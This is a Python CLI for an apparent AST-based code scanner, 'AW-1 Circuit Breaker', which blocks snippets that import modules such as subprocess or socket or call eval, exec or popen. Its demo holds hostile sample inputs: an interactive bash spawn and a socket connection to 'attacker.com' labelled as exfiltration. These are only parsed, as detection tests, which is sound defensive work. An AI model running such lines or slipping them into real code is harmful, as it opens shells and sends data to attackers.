"""
aw1_breaker/cli.py - Terminal CLI Entrypoint for AW-1 Circuit Breaker
Enables zero-install: `uvx aw1-circuit-breaker --demo`
"""
import sys
import ast
import time

BANNER = """
   ___ _       __     __
  / _ | |     / /____/ /
 / __ | | /| / //___/_/   AW-1 CIRCUIT BREAKER (v2.2.1)
/_/ |_||_/__/        Deterministic Sub-0.2ms AST Governance
"""

DANGEROUS_CALLS = {"system", "popen", "spawn", "exec", "eval", "compile", "connect"}
RESTRICTED_MODULES = {"subprocess", "os", "sys", "socket", "pty", "shutil"}

def scan_code_ast(code_str: str):
    start = time.perf_counter()
    try:
        tree = ast.parse(code_str)
    except SyntaxError as e:
        return False, f"SYNTAX_ERROR: {e}", 0.0

    violations = []
    for node in ast.walk(tree):
        # 1. Module Import Violations
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name in RESTRICTED_MODULES:
                    violations.append(f"UNAUTHORIZED_MODULE_IMPORT: '{alias.name}'")
        elif isinstance(node, ast.ImportFrom):
            if node.module in RESTRICTED_MODULES:
                violations.append(f"UNAUTHORIZED_MODULE_IMPORT: '{node.module}'")
        
        # 2. Dangerous Call Violations
        elif isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name) and node.func.id in DANGEROUS_CALLS:
                violations.append(f"RESTRICTED_INVOCATION: '{node.func.id}()'")
            elif isinstance(node.func, ast.Attribute) and node.func.attr in DANGEROUS_CALLS:
                violations.append(f"RESTRICTED_ATTRIBUTE_INVOCATION: '.{node.func.attr}()'")

    latency_ms = (time.perf_counter() - start) * 1000.0
    if violations:
        return False, " | ".join(violations), latency_ms
    return True, "AST_SLA_CLEARED", latency_ms

def main():
    args = sys.argv[1:]
    print(BANNER)

    if not args or "--help" in args or "-h" in args:
        print("Usage:")
        print("  aw1-circuit-breaker --demo")
        print("  aw1-circuit-breaker verify \"<python_code_snippet>\"")
        print("  aw1-circuit-breaker server")
        return

    if "--demo" in args:
        print("⚡ Executing 10-Second Exploit Showcase Demo...")
        samples = [
            ("Benign Math Calculation", "result = sum([i * 2 for i in range(100)])"),
            ("Dynamic Code Execution (eval)", "eval(compile('import os', '<string>', 'exec'))"),
            ("Rogue Subprocess Escape", "import subprocess; subprocess.Popen(['bash', '-i'])"),
            ("Covert Socket Exfiltration", "import socket; s = socket.connect(('attacker.com', 443))")
        ]
        print("-" * 72)
        print(f"{'TEST CASE':<34} | {'STATUS':<12} | {'LATENCY':<10} | {'VERDICT'}")
        print("-" * 72)
        for label, snippet in samples:
            passed, msg, lat = scan_code_ast(snippet)
            status = "✓ PERMITTED" if passed else "✗ BLOCKED"
            print(f"{label:<34} | {status:<12} | {lat:.4f} ms | {msg[:25]}")
        print("-" * 72)
        print("\n[✓] Deterministic AST inspection active. Zero latency overhead.")
        return

    if args[0] == "verify" and len(args) > 1:
        code_to_test = args[1]
        passed, msg, lat = scan_code_ast(code_to_test)
        if passed:
            print(f"[✓] PERMITTED (Latency: {lat:.4f} ms): {msg}")
            sys.exit(0)
        else:
            print(f"[✗] TRIPPED GATE 7 (Latency: {lat:.4f} ms): {msg}")
            sys.exit(1)

    if args[0] == "server":
        print("[*] Starting local MCP JSON-RPC Server...")
        try:
            from .mcp_server import main as run_server
            run_server()
        except ImportError:
            import mcp_server
            mcp_server.main()

if __name__ == "__main__":
    main()
